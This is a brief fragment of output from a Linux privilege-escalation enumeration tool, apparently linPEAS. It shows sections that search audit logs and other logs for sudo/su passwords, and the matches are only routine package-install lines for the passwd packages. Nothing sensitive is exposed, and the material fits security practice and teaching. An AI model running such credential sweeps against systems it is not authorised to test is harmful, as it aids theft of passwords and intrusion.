/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                       
╔══════════╣ Searching passwords inside logs (limit 70)
2018-04-13 23:05:11 configure base-passwd 3.5.22 3.5.22                                                                                                                
2018-04-13 23:05:11 install base-passwd <none> 3.5.22
2018-04-13 23:05:11 status half-configured base-passwd 3.5.22
2018-04-13 23:05:11 status half-installed base-passwd 3.5.22
2018-04-13 23:05:11 status installed base-passwd 3.5.22
2018-04-13 23:05:11 status unpacked base-passwd 3.5.22
2018-04-13 23:05:13 status half-configured base-passwd 3.5.22
2018-04-13 23:05:13 status half-installed base-passwd 3.5.22
2018-04-13 23:05:13 status unpacked base-passwd 3.5.22
2018-04-13 23:05:13 upgrade base-passwd 3.5.22 3.5.22
2018-04-13 23:05:20 install passwd <none> 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:20 status half-installed passwd 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:20 status unpacked passwd 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:21 status unpacked passwd 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:23 configure base-passwd 3.5.22 3.5.22
2018-04-13 23:05:23 status half-configured base-passwd 3.5.22
2018-04-13 23:05:23 status installed base-passwd 3.5.22
2018-04-13 23:05:23 status unpacked base-passwd 3.5.22
2018-04-13 23:05:26 configure passwd 1:4.1.4.2-1ubuntu2 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:26 status half-configured passwd 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:26 status installed passwd 1:4.1.4.2-1ubuntu2
2018-04-13 23:05:26 status unpacked passwd 1:4.1.4.2-1ubuntu2
Description: Set up users and passwords



```